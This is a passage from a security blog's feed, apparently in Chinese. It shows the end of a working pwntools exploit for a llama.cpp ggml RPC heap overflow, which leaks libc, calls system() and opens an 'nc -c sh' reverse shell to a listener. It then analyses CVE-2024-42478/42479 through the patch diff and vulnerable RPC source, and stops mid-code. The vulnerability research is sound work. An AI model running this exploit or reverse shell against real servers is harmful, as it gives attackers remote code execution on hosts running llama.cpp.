class="comment"># uint64_t data</span></span><br><span class="line">            <span class="string">&#x27;a&#x27;</span> * <span class="number">64</span>,               <span class="comment"># name</span></span><br><span class="line">            <span class="string">&#x27;x&#x27;</span> * <span class="number">4</span>                 <span class="comment"># padding</span></span><br><span class="line">        ],</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">srv = pwntube(args) <span class="keyword">if</span> <span class="keyword">not</span> args.remote <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">pause()</span><br><span class="line">rpc = RpcConnection()</span><br><span class="line"></span><br><span class="line"><span class="comment"># heap fengshui</span></span><br><span class="line">written_buffer, _ = rpc.alloc_buffer(<span class="number">0x10000</span>)</span><br><span class="line">written_buffer_base = rpc.buffer_get_base(written_buffer)</span><br><span class="line">buffer1, _ = rpc.alloc_buffer(<span class="number">0x500</span>)</span><br><span class="line">buffer1_base = rpc.buffer_get_base(buffer1)</span><br><span class="line">rpc.free_buffer(buffer1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc and heap address</span></span><br><span class="line">buffer2, _ = rpc.alloc_buffer(<span class="number">0x80</span>)</span><br><span class="line">buffer2_base = rpc.buffer_get_base(buffer2)  <span class="comment"># 0x555555580e80 % 0x40 == 0</span></span><br><span class="line">buffer3, _ = rpc.alloc_buffer(<span class="number">0x60</span>)</span><br><span class="line">buffer3_base = rpc.buffer_get_base(buffer3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack buffer2-&gt;iface</span></span><br><span class="line">tensor1 = construct_tensor(</span><br><span class="line">    buffer2, buffer2_base,</span><br><span class="line">    <span class="comment"># get_nbytes: 0x80</span></span><br><span class="line">    <span class="number">2</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">)</span><br><span class="line">recv = rpc.get_tensor(tensor1, <span class="number">0</span>, <span class="number">0x20</span>)</span><br><span class="line">libc_leak = u64(recv[:<span class="number">0x8</span>])</span><br><span class="line">libc_base = libc_leak - <span class="number">0x4a0</span> - libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">heap_leak = u64(recv[<span class="number">0x10</span>:<span class="number">0x18</span>])</span><br><span class="line">plog.address(libc_leak=libc_leak, libc_base=libc_base,</span><br><span class="line">             heap_leak=heap_leak)</span><br><span class="line"></span><br><span class="line">tensor2 = construct_tensor(</span><br><span class="line">    written_buffer, written_buffer_base,</span><br><span class="line">    <span class="comment"># get_nbytes: 0x100</span></span><br><span class="line">    <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">)</span><br><span class="line">data = cyclic(<span class="number">0x80</span>)</span><br><span class="line">data += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">data += flat([</span><br><span class="line">    <span class="string">b&quot;nc -c sh 127.0.0.1 1337&quot;</span>.ljust(<span class="number">0x37</span>, <span class="string">b&quot; &quot;</span>) + <span class="string">b&quot;\x00&quot;</span>,</span><br><span class="line">    libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">])</span><br><span class="line">rpc.set_tensor(tensor2, <span class="number">0</span>, data)</span><br><span class="line"></span><br><span class="line">dst_tensor = tensor1</span><br><span class="line">src_tensor = construct_tensor(</span><br><span class="line">    written_buffer, written_buffer_base,</span><br><span class="line">    <span class="comment"># get_nbytes: 0xd0</span></span><br><span class="line">    <span class="number">2</span>, <span class="number">105</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">)</span><br><span class="line">rpc.copy_tensor(src_tensor, dst_tensor)</span><br><span class="line"></span><br><span class="line"><span class="comment"># triiger system</span></span><br><span class="line">rpc.buffer_clear(buffer2)</span><br><span class="line"></span><br><span class="line">rpc.io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> srv:</span><br><span class="line">    srv.interactive()</span><br><span class="line">    srv.close()</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><a href="https://retr0.blog/blog/llama-rpc-rce">Llama’s Paradox - Delving deep into Llama.cpp and exploiting Llama.cpp’s Heap Maze, from Heap-Overflow to Remote-Code Execution</a><ol><li><a href="https://paper.seebug.org/3299/">Llama 的悖论：深入探索 Llama.cpp 的堆迷宫，从堆溢出到远程代码执行</a></li><li><a href="https://github.com/Protosec-Research/ggml-nbytes">https://github.com/Protosec-Research/ggml-nbytes</a></li><li><a href="https://gist.github.com/retr0reg/d13de3fde8f9d138fe1af48e59e630a9">https://gist.github.com/retr0reg/d13de3fde8f9d138fe1af48e59e630a9</a></li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;问题处在 ggml 组件中，影响的最后一个 tag 是 b4651。在 llama.cpp 修复了 &lt;a href=&quot;https://git</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://the-soloist.github.io/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="LLM" scheme="https://the-soloist.github.io/tag/LLM/"/>
    
  </entry>
  
  <entry>
    <title>llama.cpp版本小于b3561时GET_TENSOR SET_TENSOR组合漏洞RCE分析</title>
    <link href="https://the-soloist.github.io/2025/09/15/llama-cpp-tensor-rce1/"/>
    <id>https://the-soloist.github.io/2025/09/15/llama-cpp-tensor-rce1/</id>
    <published>2025-09-15T11:58:23.000Z</published>
    <updated>2025-12-17T15:05:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>24 年的时候，llama.cpp 出了两个漏洞 <a href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-5vm9-p64x-gqw9">GHSA-5vm9-p64x-gqw9</a>和<a href="https://github.com/ggerganov/llama.cpp/security/advisories/GHSA-wcr5-566p-9cwj">GHSA-wcr5-566p-9cwj</a>（也就是 CVE-2024-42478 和 CVE-2024-42479）。影响版本是&lt;&#x3D;b3560，并在 b3561 中进行了修复。</p><p>根据 Github 中的描述，我们能控制 rpc_tensor 结构体中的 data 指针，可以实现任意地址读写，并且给出了调用链和 poc。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>编译命令</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -B build -DGGML_RPC=ON -DCMAKE_CXX_FLAGS_RELEASE=&quot;-g&quot;</span><br><span class="line">cmake --build build -j 32</span><br></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="Diff-分析"><a href="#Diff-分析" class="headerlink" title="Diff 分析"></a>Diff 分析</h2><p>根据给出的版本号，笔者对 b3560 和 b3561 两个 tag 进行了 diff。结果如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/examples/rpc/README.md b/examples/rpc/README.md</span></span><br><span class="line"><span class="comment">index e1da801f..adedc890 100644</span></span><br><span class="line"><span class="comment">--- a/examples/rpc/README.md</span></span><br><span class="line"><span class="comment">+++ b/examples/rpc/README.md</span></span><br><span class="line"><span class="meta">@@ -1,5 +1,9 @@</span></span><br><span class="line"> ## Overview</span><br><span class="line"></span><br><span class="line"><span class="addition">+&gt; [!IMPORTANT]</span></span><br><span class="line"><span class="addition">+&gt; This example and the RPC backend are currently in a proof-of-concept development stage. As such, the functionality is fragile and</span></span><br><span class="line"><span class="addition">+&gt; insecure. **Never run the RPC server on an open network or in a sensitive environment!**</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> The `rpc-server` allows  running `ggml` backend on a remote host.</span><br><span class="line"> The RPC backend communicates with one or several instances of `rpc-server` and offloads computations to them.</span><br><span class="line"> This can be used for distributed LLM inference with `llama.cpp` in the following way:</span><br><span class="line"><span class="comment">diff --git a/examples/rpc/rpc-server.cpp b/examples/rpc/rpc-server.cpp</span></span><br><span class="line"><span class="comment">index 7c15d2aa..6342e648 100644</span></span><br><span class="line"><span class="comment">--- a/examples/rpc/rpc-server.cpp</span></span><br><span class="line"><span class="comment">+++ b/examples/rpc/rpc-server.cpp</span></span><br><span class="line"><span class="meta">@@ -16,7 +16,7 @@</span></span><br><span class="line"> #include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"> struct rpc_server_params &#123;</span><br><span class="line"><span class="deletion">-    std::string host        = &quot;0.0.0.0&quot;;</span></span><br><span class="line"><span class="addition">+    std::string host        = &quot;127.0.0.1&quot;;</span></span><br><span class="line">     int         port        = 50052;</span><br><span class="line">     size_t      backend_mem = 0;</span><br><span class="line"> &#125;;</span><br><span class="line"><span class="meta">@@ -114,6 +114,17 @@</span> int main(int argc, char * argv[]) &#123;</span><br><span class="line">         fprintf(stderr, &quot;Invalid parameters\n&quot;);</span><br><span class="line">         return 1;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    if (params.host != &quot;127.0.0.1&quot;) &#123;</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;\n&quot;);</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n&quot;);</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;WARNING: Host (&#x27;%s&#x27;) is != &#x27;127.0.0.1&#x27;\n&quot;, params.host.c_str());</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;         Never expose the RPC server to an open network!\n&quot;);</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;         This is an experimental feature and is not secure!\n&quot;);</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n&quot;);</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;\n&quot;);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     ggml_backend_t backend = create_backend();</span><br><span class="line">     if (!backend) &#123;</span><br><span class="line">         fprintf(stderr, &quot;Failed to create backend\n&quot;);</span><br><span class="line"><span class="comment">diff --git a/ggml/src/ggml-rpc.cpp b/ggml/src/ggml-rpc.cpp</span></span><br><span class="line"><span class="comment">index b01ad267..7757615f 100644</span></span><br><span class="line"><span class="comment">--- a/ggml/src/ggml-rpc.cpp</span></span><br><span class="line"><span class="comment">+++ b/ggml/src/ggml-rpc.cpp</span></span><br><span class="line"><span class="meta">@@ -197,6 +197,10 @@</span> static std::shared_ptr&lt;socket_t&gt; create_server_socket(const char * host, int por</span><br><span class="line">         fprintf(stderr, &quot;Failed to set SO_REUSEADDR\n&quot;);</span><br><span class="line">         return nullptr;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    if (inet_addr(host) == INADDR_NONE) &#123;</span></span><br><span class="line"><span class="addition">+        fprintf(stderr, &quot;Invalid host address: %s\n&quot;, host);</span></span><br><span class="line"><span class="addition">+        return nullptr;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line">     struct sockaddr_in serv_addr;</span><br><span class="line">     serv_addr.sin_family = AF_INET;</span><br><span class="line">     serv_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line"><span class="meta">@@ -879,6 +883,14 @@</span> ggml_tensor * rpc_server::deserialize_tensor(struct ggml_context * ctx, const rp</span><br><span class="line">     if (result-&gt;buffer &amp;&amp; buffers.find(result-&gt;buffer) == buffers.end()) &#123;</span><br><span class="line">         return nullptr;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    // require that the tensor data does not go beyond the buffer end</span></span><br><span class="line"><span class="addition">+    uint64_t tensor_size = (uint64_t) ggml_nbytes(result);</span></span><br><span class="line"><span class="addition">+    uint64_t buffer_start = (uint64_t) ggml_backend_buffer_get_base(result-&gt;buffer);</span></span><br><span class="line"><span class="addition">+    uint64_t buffer_size = (uint64_t) ggml_backend_buffer_get_size(result-&gt;buffer);</span></span><br><span class="line"><span class="addition">+    GGML_ASSERT(tensor-&gt;data + tensor_size &gt;= tensor-&gt;data); // check for overflow</span></span><br><span class="line"><span class="addition">+    GGML_ASSERT(tensor-&gt;data &gt;= buffer_start &amp;&amp; tensor-&gt;data + tensor_size &lt;= buffer_start + buffer_size);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     result-&gt;op = (ggml_op) tensor-&gt;op;</span><br><span class="line">     for (uint32_t i = 0; i &lt; GGML_MAX_OP_PARAMS / sizeof(int32_t); i++) &#123;</span><br><span class="line">         result-&gt;op_params[i] = tensor-&gt;op_params[i];</span><br><span class="line"><span class="meta">@@ -898,7 +910,7 @@</span> bool rpc_server::set_tensor(const std::vector&lt;uint8_t&gt; &amp; input) &#123;</span><br><span class="line">     const rpc_tensor * in_tensor = (const rpc_tensor *)input.data();</span><br><span class="line">     uint64_t offset;</span><br><span class="line">     memcpy(&amp;offset, input.data() + sizeof(rpc_tensor), sizeof(offset));</span><br><span class="line"><span class="deletion">-    size_t size = input.size() - sizeof(rpc_tensor) - sizeof(offset);</span></span><br><span class="line"><span class="addition">+    const size_t size = input.size() - sizeof(rpc_tensor) - sizeof(offset);</span></span><br><span class="line"></span><br><span class="line">     struct ggml_init_params params &#123;</span><br><span class="line">         /*.mem_size   =*/ ggml_tensor_overhead(),</span><br><span class="line"><span class="meta">@@ -913,6 +925,17 @@</span> bool rpc_server::set_tensor(const std::vector&lt;uint8_t&gt; &amp; input) &#123;</span><br><span class="line">         return false;</span><br><span class="line">     &#125;</span><br><span class="line">     GGML_PRINT_DEBUG(&quot;[%s] buffer: %p, data: %p, offset: %&quot; PRIu64 &quot;, size: %zu\n&quot;, __func__, (void*)tensor-&gt;buffer, tensor-&gt;data, offset, size);</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    // sanitize tensor-&gt;data</span></span><br><span class="line"><span class="addition">+    &#123;</span></span><br><span class="line"><span class="addition">+        const size_t p0 = (size_t) ggml_backend_buffer_get_base(tensor-&gt;buffer);</span></span><br><span class="line"><span class="addition">+        const size_t p1 = p0 + ggml_backend_buffer_get_size(tensor-&gt;buffer);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        if (in_tensor-&gt;data + offset &lt; p0 || in_tensor-&gt;data + offset &gt;= p1 || size &gt; (p1 - in_tensor-&gt;data - offset)) &#123;</span></span><br><span class="line"><span class="addition">+            GGML_ABORT(&quot;[%s] tensor-&gt;data out of bounds\n&quot;, __func__);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     const void * data = input.data() + sizeof(rpc_tensor) + sizeof(offset);</span><br><span class="line">     ggml_backend_tensor_set(tensor, data, offset, size);</span><br><span class="line">     ggml_free(ctx);</span><br><span class="line"><span class="meta">@@ -943,6 +966,17 @@</span> bool rpc_server::get_tensor(const std::vector&lt;uint8_t&gt; &amp; input, std::vector&lt;uint</span><br><span class="line">         return false;</span><br><span class="line">     &#125;</span><br><span class="line">     GGML_PRINT_DEBUG(&quot;[%s] buffer: %p, data: %p, offset: %&quot; PRIu64 &quot;, size: %&quot; PRIu64 &quot;\n&quot;, __func__, (void*)tensor-&gt;buffer, tensor-&gt;data, offset, size);</span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    // sanitize tensor-&gt;data</span></span><br><span class="line"><span class="addition">+    &#123;</span></span><br><span class="line"><span class="addition">+        const size_t p0 = (size_t) ggml_backend_buffer_get_base(tensor-&gt;buffer);</span></span><br><span class="line"><span class="addition">+        const size_t p1 = p0 + ggml_backend_buffer_get_size(tensor-&gt;buffer);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        if (in_tensor-&gt;data + offset &lt; p0 || in_tensor-&gt;data + offset &gt;= p1 || size &gt; (p1 - in_tensor-&gt;data - offset)) &#123;</span></span><br><span class="line"><span class="addition">+            GGML_ABORT(&quot;[%s] tensor-&gt;data out of bounds\n&quot;, __func__);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line">     // output serialization format: | data (size bytes) |</span><br><span class="line">     output.resize(size, 0);</span><br><span class="line">     ggml_backend_tensor_get(tensor, output.data(), offset, size);</span><br><span class="line"><span class="comment">diff --git a/ggml/src/ggml.c b/ggml/src/ggml.c</span></span><br><span class="line"><span class="comment">index c937b5e5..38990e3a 100644</span></span><br><span class="line"><span class="comment">--- a/ggml/src/ggml.c</span></span><br><span class="line"><span class="comment">+++ b/ggml/src/ggml.c</span></span><br><span class="line"><span class="meta">@@ -3724,7 +3724,8 @@</span> static struct ggml_tensor * ggml_new_tensor_impl(</span><br><span class="line">         struct ggml_tensor  * view_src,</span><br><span class="line">         size_t                view_offs) &#123;</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    assert(n_dims &gt;= 1 &amp;&amp; n_dims &lt;= GGML_MAX_DIMS);</span></span><br><span class="line"><span class="addition">+    GGML_ASSERT(type &gt;= 0 &amp;&amp; type &lt; GGML_TYPE_COUNT);</span></span><br><span class="line"><span class="addition">+    GGML_ASSERT(n_dims &gt;= 1 &amp;&amp; n_dims &lt;= GGML_MAX_DIMS);</span></span><br><span class="line"></span><br><span class="line">     // find the base tensor and absolute offset</span><br><span class="line">     if (view_src != NULL &amp;&amp; view_src-&gt;view_src != NULL) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​ <code>rpc_server::deserialize_tensor</code>、<code>rpc_server::set_tensor</code>、<code>rpc_server::get_tensor</code> 这几个方法添加了对 <code>tensor-&gt;data</code>、<code>offset</code>、<code>size</code> 的边界检查。根据 patch 来看，在添加检查之前，<code>tensor-&gt;data+offset+size</code> 是有可能越界的。</p><h2 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h2><p>作者直接给出了两个漏洞的调用链。</p><p>任意地址读调用链：</p><ul><li>start_rpc_server<ul><li>rpc_serve_client<ul><li>rpc_server::get_tensor<ul><li>ggml_backend_tensor_get<ul><li>ggml_backend_cpu_buffer_get_tensor</li></ul></li></ul></li></ul></li></ul></li></ul><p>任意地址写调用链：</p><ul><li>start_rpc_server<ul><li>rpc_serve_client<ul><li>rpc_server::set_tensor<ul><li>ggml_backend_tensor_set<ul><li>ggml_backend_cpu_buffer_set_tensor</li></ul></li></ul></li></ul></li></ul></li></ul><p>这两个漏洞的调用链差不多，我们先来看任意读</p><h3 id="任意地址读漏洞"><a href="#任意地址读漏洞" class="headerlink" title="任意地址读漏洞"></a>任意地址读漏洞</h3><h4 id="start-rpc-server"><a href="#start-rpc-server" class="headerlink" title="start_rpc_server"></a>start_rpc_server</h4><p>start_rpc_server 是 RPC 服务的开始，初始化 socket 服务之后，进入循环</p><ol><li><code>socket_accept()</code> 阻塞等待客户端连接</li><li>调用 <code>rpc_serve_client()</code> 处理单个客户端的 RPC 请求</li></ol><h4 id="rpc-serve-client"><a href="#rpc-serve-client" class="headerlink" title="rpc_serve_client"></a>rpc_serve_client</h4><p>rpc_serve_client 为每一个客户端连接创建一个 <code>rpc_server</code> 实例，然后读取 1 字节 cmd，8 字节 input_size，以及 <code>input.data()</code>。因此每次通信的数据包结构如下：</p><table><thead><tr><th>数据包</th><th>cmd</th><th>input_size</th><th>input.data()</th></tr></thead><tbody><tr><td>bytes</td><td>1</td><td>8</td><td>input_size</td></tr></tbody></table><p>继续往下看是一个 switch 结构，add、edit、show、delete 都有了（CTF 选手的 DNA 动了）</p><p><img src="/2025/09/15/llama-cpp-tensor-rce1/../llama-cpp-tensor-rce1/de852b2e313b3b29b9592707c8c3ef4c.png"></p><h4 id="rpc-server-get-tensor"><a href="#rpc-server-get-tensor" class="headerlink" title="rpc_server::get_tensor"></a>rpc_server::get_tensor</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">rpc_server::get_tensor</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">uint8_t</span>&gt; &amp; input, std::vector&lt;<span class="type">uint8_t</span>&gt; &amp; output)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// serialization format: | rpc_tensor | offset (8 bytes) | size (8 bytes) |</span></span><br><span class="line">    <span class="keyword">if</span> (input.<span class="built_in">size</span>() != <span class="built_in">sizeof</span>(rpc_tensor) + <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> rpc_tensor * in_tensor = (<span class="type">const</span> rpc_tensor *)input.<span class="built_in">data</span>();</span><br><span class="line">    <span class="type">uint64_t</span> offset;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;offset, input.<span class="built_in">data</span>() + <span class="built_in">sizeof</span>(rpc_tensor), <span class="built_in">sizeof</span>(offset));</span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;size, input.<span class="built_in">data</span>() + <span class="built_in">sizeof</span>(rpc_tensor) + <span class="built_in">sizeof</span>(offset), <span class="built_in">sizeof</span>(size));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ggml_init_params</span> params &#123;</span><br><span class="line">        <span class="comment">/*.mem_size   =*/</span> <span class="built_in">ggml_tensor_overhead</span>(),</span><br><span class="line">        <span class="comment">/*.mem_buffer =*/</span> <span class="literal">NULL</span>,</span><br><span class="line">        <span class="comment">/*.no_alloc   =*/</span> <span class="literal">true</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ggml_context</span> * ctx = <span class="built_in">ggml_init</span>(params);</span><br><span class="line">    ggml_tensor * tensor = <span class="built_in">deserialize_tensor</span>(ctx, in_tensor);</span><br><span class="line">    <span class="keyword">if</span> (tensor == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        <span class="built_in">GGML_PRINT_DEBUG</span>(<span class="string">&quot;[%s] error deserializing tensor\n&quot;</span>, __func__);</span><br><span class="line">        <span class="built_in">ggml_free</span>(ctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">GGML_PRINT_DEBUG</span>(<span class="string">&quot;[%s] buffer: %p, data: %p, offset: %&quot;</span> PRIu64 <span class="string">&quot;, size: %&quot;</span> PRIu64 <span class="string">&quot;\n&quot;</span>, __func__, (<span class="type">void</span>*)tensor-&gt;buffer, tensor-&gt;data, offset, size);</span><br><span class="line">    <span class="comment">// output serialization format: | data (size bytes) |</span></span><br><span class="line">    output.<span class="built_in">resize</span>(size, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">ggml_backend_tensor_get</span>(tensor, output.<span class="built_in">data</span>(), offset, size);</span><br><span class="line">    <span class="built_in">ggml_free</span>(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_tensor 会先验证输入的数据大小，并且解析出：rpc_tensor  结构体、offset（8 字节）、size（8 字节），这几个字段。也就是说我们能完全控制 tensor 结构体的内容。</p><p>然后创建一个临时的 ctx，并且对输入的 tensor 反序列化。deserialize_tensor 会把 tensor 中的一些字段拷贝到 result 中，这里需要注意的是 deserialize_tensor 会检测 <code>result-&gt;buffer</code> 是否在 buffers 中，不在则会返回 nullptr，所以 buffer 必须是一个合法的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ggml_tensor * <span class="title">rpc_server::deserialize_tensor</span><span class="params">(<span class="keyword">struct</span> ggml_context * ctx, <span class="type">const</span> rpc_tensor * tensor)</span> </span>&#123;</span><br><span class="line">    ggml_tensor * result = <span class="built_in">ggml_new_tensor_4d</span>(ctx, (ggml_type) tensor-&gt;type,</span><br><span class="line">        tensor-&gt;ne[<span class="number">0</span>], tensor-&gt;ne[<span class="number">1</span>], tensor-&gt;ne[<span class="number">2</span>], tensor-&gt;ne[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; GGML_MAX_DIMS; i++) &#123;</span><br><span class="line">        result-&gt;nb[i] = tensor-&gt;nb[i];</span><br><span class="line">    &#125;</span><br><span class="line">    result-&gt;buffer = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">ggml_backend_buffer_t</span>&gt;(tensor-&gt;buffer);</span><br><span class="line">    <span class="keyword">if</span> (result-&gt;buffer &amp;&amp; buffers.<span 